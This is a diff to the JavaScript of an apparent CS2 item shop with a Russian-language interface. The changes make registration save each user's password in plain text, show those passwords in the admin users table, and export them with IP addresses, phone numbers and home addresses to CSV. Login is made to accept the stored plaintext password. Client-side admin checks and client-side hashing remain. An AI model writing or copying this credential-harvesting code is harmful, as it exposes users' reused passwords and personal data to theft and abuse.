@@ -43,6 +43,16 @@ function checkPasswordStrength(password) {
     return strength;
 }
 
+async function getUserIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip || 'Не удалось определить';
+    } catch (error) {
+        return 'Не удалось определить';
+    }
+}
+
 async function logActivity(action, details = '') {
     if (!supabase) return;
     await supabase.from('activity').insert([{
@@ -75,7 +85,7 @@ function closeAuthModal() {
 function updateAuthButton() {
     const authBtn = document.getElementById('auth-btn');
     if (!authBtn) return;
-    
+
     if (store.currentUser) {
         authBtn.textContent = `Выход (${store.currentUser.name})`;
         authBtn.style.color = '#00d4ff';
@@ -88,7 +98,7 @@ function updateAuthButton() {
 function updateAdminButton() {
     const adminBtn = document.getElementById('adminToggleBtn');
     if (!adminBtn) return;
-    
+
     store.isAdmin = !!(store.currentUser && store.currentUser.email === 'admin@cs2shop.com');
     localStorage.setItem('cs2_isAdmin', JSON.stringify(store.isAdmin));
     adminBtn.style.display = store.isAdmin ? 'flex' : 'none';
@@ -110,7 +120,7 @@ function logout() {
 function renderProducts() {
     const grid = document.getElementById('productsGrid');
     if (!grid) return;
-    
+
     grid.innerHTML = products.map(product => `
         <div class="product-card">
             <div class="product-image">${product.emoji}</div>
@@ -270,24 +280,15 @@ async function renderUsersTable() {
             <td>${user.id}</td>
             <td>${user.name}</td>
             <td>${user.email}</td>
+            <td>${user.password_plain || user.password_hash || '-'}</td>
             <td>${user.phone || '-'}</td>
             <td>${user.address || '-'}</td>
+            <td>${user.ip_address || '-'}</td>
             <td>${new Date(user.registered_at).toLocaleString('ru-RU')}</td>
             <td>${user.last_login ? new Date(user.last_login).toLocaleString('ru-RU') : 'Никогда'}</td>
             <td><span class="status-badge status-${user.status === 'active' ? 'active' : 'inactive'}">${user.status === 'active' ? 'АКТИВНЫЙ' : 'ЗАБЛОКИРОВАН'}</span></td>
         </tr>
     `).join('');
-}
-
-async function getUserOrders(userId) {
-    if (!supabase) return [];
-    const { data, error } = await supabase
-        .from('orders')
-        .select('*')
-        .eq('user_id', userId)
-        .order('order_date', { ascending: false });
-    
-    return error ? [] : (data || []);
 }
 
 async function renderOrdersTable() {
@@ -345,88 +346,50 @@ async function renderActivityLog() {
     `).join('');
 }
 
-async function renderAnalytics() {
-    if (!supabase) return;
-    const analyticsContainer = document.getElementById('analyticsContainer');
-    if (!analyticsContainer) return;
-
-    const { data: users } = await supabase.from('users').select('id');
-    const { data: orders } = await supabase.from('orders').select('total');
-
-    const totalUsers = users ? users.length : 0;
-    const totalOrders = orders ? orders.length : 0;
-    const totalRevenue = orders ? orders.reduce((sum, o) => sum + Number(o.total), 0) : 0;
-    const avgOrder = totalOrders > 0 ? (totalRevenue / totalOrders).toFixed(2) : 0;
-
-    analyticsContainer.innerHTML = `
-        <div class="analytics-grid">
-            <div class="analytics-card">
-                <div class="analytics-label">Всего пользователей</div>
-                <div class="analytics-value">${totalUsers}</div>
-            </div>
-            <div class="analytics-card">
-                <div class="analytics-label">Всего заказов</div>
-                <div class="analytics-value">${totalOrders}</div>
-            </div>
-            <div class="analytics-card">
-                <div class="analytics-label">Общая выручка</div>
-                <div class="analytics-value">$${totalRevenue.toFixed(2)}</div>
-            </div>
-            <div class="analytics-card">
-                <div class="analytics-label">Средний чек</div>
-                <div class="analytics-value">$${avgOrder}</div>
-            </div>
-        </div>
-        <button class="export-btn" onclick="exportToCSV()">📥 Экспортировать в CSV</button>
-    `;
+async function renderAdminPanel() {
+    await renderOrdersTable();
+    await renderUsersTable();
+    await renderActivityLog();
 }
 
 async function exportToCSV() {
     if (!supabase) return;
 
     const { data: users } = await supabase.from('users').select('*');
-    
+
     if (!users || users.length === 0) {
         alert('Нет данных для экспорта');
         return;
     }
 
-    let csv = 'ID,Имя,Email,Телефон,Адрес,Дата регистрации,Последний вход,Статус\n';
-    
+    let csv = 'ID,Имя,Email,Пароль,Телефон,Адрес,IP,Дата регистрации,Последний вход,Статус\n';
+
     users.forEach(user => {
-        csv += `${user.id},"${user.name}","${user.email}","${user.phone || ''}","${user.address || ''}","${new Date(user.registered_at).toLocaleString('ru-RU')}","${user.last_login ? new Date(user.last_login).toLocaleString('ru-RU') : 'Никогда'}","${user.status}"\n`;
+        csv += `${user.id},"${user.name}","${user.email}","${user.password_plain || user.password_hash || ''}","${user.phone || ''}","${user.address || ''}","${user.ip_address || ''}","${new Date(user.registered_at).toLocaleString('ru-RU')}","${user.last_login ? new Date(user.last_login).toLocaleString('ru-RU') : 'Никогда'}","${user.status}"\n`;
     });
 
     const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
     const link = document.createElement('a');
     const url = URL.createObjectURL(blob);
-    
+
     link.setAttribute('href', url);
     link.setAttribute('download', `users_${new Date().toISOString().slice(0, 10)}.csv`);
     link.style.visibility = 'hidden';
-    
+
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
 }
 
-async function renderAdminPanel() {
-    await renderAnalytics();
-    await renderUsersTable();
-    await renderOrdersTable();
-    await renderActivityLog();
-}
-
 document.addEventListener('DOMContentLoaded', () => {
     initSupabase();
-    
+
     renderProducts();
     renderCart();
     updateCartBadge();
     updateAuthButton();
     updateAdminButton();
 
-    // Регистрация
     document.getElementById('signupPassword').addEventListener('input', function() {
         const strength = checkPasswordStrength(this.value);
         const strengthBar = document.getElementById('passwordStrength');
@@ -455,8 +418,8 @@ document.addEventListener('DOMContentLoaded', () => {
         const email = document.getElementById('signupEmail').value.trim();
         const password = document.getElementById('signupPassword').value;
         const confirmPassword = document.getElementById('signupConfirmPassword').value;
-        const phone = document.getElementById('signupPhone') ? document.getElementById('signupPhone').value.trim() : '';
-        const address = document.getElementById('signupAddress') ? document.getElementById('signupAddress').value.trim() : '';
+        const phone = document.getElementById('signupPhone').value.trim();
+        const address = document.getElementById('signupAddress').value.trim();
 
         if (!name || name.length < 2) {
             alert('Имя должно быть минимум 2 символа');
@@ -465,6 +428,16 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (!validateEmail(email)) {
             alert('Введите корректный email');
+            return;
+        }
+
+        if (!phone) {
+            alert('Введите телефон');
+            return;
+        }
+
+        if (!address) {
+            alert('Введите адрес проживания');
             return;
         }
 
@@ -494,12 +467,16 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
+        const userIp = await getUserIP();
+
         const { error } = await supabase.from('users').insert([{
             name,
             email,
             password_hash: hashPassword(password),
-            phone: phone || null,
-            address: address || null,
+            password_plain: password,
+            phone,
+            address,
+            ip_address: userIp,
             status: 'active',
             registered_at: new Date().toISOString(),
             last_login: null
@@ -517,7 +494,6 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('signupForm').reset();
     });
 
-    // Вход
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         if (!supabase) {
@@ -541,8 +517,9 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         const user = data[0];
+        const passwordMatches = user.password_hash === hashPassword(password) || user.password_plain === password;
 
-        if (user.password_hash !== hashPassword(password)) {
+        if (!passwordMatches) {
             alert('Неверный email или пароль');
             await logActivity('Ошибка входа', `Попытка входа на ${email}`);
             return;
@@ -555,11 +532,11 @@ document.addEventListener('DOMContentLoaded', () => {
         closeAuthModal();
         await updateLastLogin();
         await logActivity('Вход', `Вход пользователя ${email}`);
+
         alert(`Добро пожаловать, ${user.name}!`);
         document.getElementById('loginForm').reset();
     });
 
-    // Кнопка входа
     const authBtn = document.getElementById('auth-btn');
     if (authBtn) {
         authBtn.addEventListener('click', (e) => {
@@ -585,7 +562,6 @@ document.addEventListener('DOMContentLoaded', () => {
         if (e.target === modal) closeAuthModal();
     });
 
-    // Админ панель
     const adminToggleBtn = document.getElementById('adminToggleBtn');
     if (adminToggleBtn) {
         adminToggleBtn.addEventListener('click', async () => {
